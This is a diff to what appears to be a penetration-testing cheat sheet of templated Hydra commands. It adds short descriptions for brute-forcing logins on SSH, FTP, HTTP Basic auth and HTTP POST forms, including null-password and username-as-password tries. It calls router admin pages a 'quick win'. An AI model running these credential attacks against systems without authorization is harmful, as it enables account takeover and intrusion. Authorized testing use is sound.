@@ -13,6 +13,8 @@ import wordlists_users
 
 Dump brute service login with Hydra.
 
+Brute one user with a password list against the chosen service (FTP, SSH, IMAP, MSSQL, RDP, VNC, SMTP, MySQL, etc.).
+
 ```sh title:"Hydra Dump Brute Service Login"
 hydra -l $user -P $wordlists $scheme_hydra_protocol://$domain
 ```
@@ -26,6 +28,8 @@ import domain_ip
 
 Dump user and password lists with Hydra.
 
+Brute a chosen service with user and password lists.
+
 ```sh title:"Hydra Dump User and Password Lists"
 hydra -L "$wordlists_users" -P "$wordlists" "$rhost_ip" "$scheme_hydra_protocol"
 ```
@@ -37,6 +41,8 @@ var rhost_ip
 ### Single password
 
 Dump single password with Hydra.
+
+Try one username and one password against SSH.
 
 ```sh title:"Hydra Dump Single Password"
 hydra -l "$user" -p "$pass" "$rhost_ip" ssh
@@ -51,6 +57,8 @@ var rhost_ip
 
 Dump username as password with Hydra.
 
+Try each username as its own password against SSH.
+
 ```sh title:"Hydra Dump Username as Password"
 hydra -L "$wordlists_users" -e s "$rhost_ip" ssh
 ```
@@ -63,6 +71,8 @@ var rhost_ip
 
 Dump null password with Hydra.
 
+Try a null password against SSH for one username.
+
 ```sh title:"Hydra Dump Null Password"
 hydra -l "$user" -e n "$rhost_ip" ssh
 ```
@@ -74,6 +84,8 @@ var rhost_ip
 ### Login-pass file
 
 Run login pass file with Hydra.
+
+Use a `user:pass` combo file against SSH on a custom port.
 
 ```sh title:"Hydra Run Login Pass File"
 hydra -t 4 -s "$rport" -C "$combo_file" "$rhost_ip" ssh
@@ -88,6 +100,8 @@ var rhost_ip
 
 Run brute HTTP basic auth with Hydra.
 
+Brute HTTP Basic auth on the document root. Quick win against router admin pages and old internal apps.
+
 ```sh title:"Hydra Run Brute HTTP Basic Auth"
 hydra -l $user -P $wordlists $domain http-get
 ```
@@ -100,6 +114,8 @@ import domain_ip
 ### Brute HTTP POST form
 
 Run brute HTTP POST form with Hydra.
+
+Brute a form-based login over HTTP POST. Edit the path, parameter names, and the failure-string (`F=incorrect`) to match the target app.
 
 ```sh title:"Hydra Run Brute HTTP POST Form"
 hydra -l $user -P $wordlists $domain http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
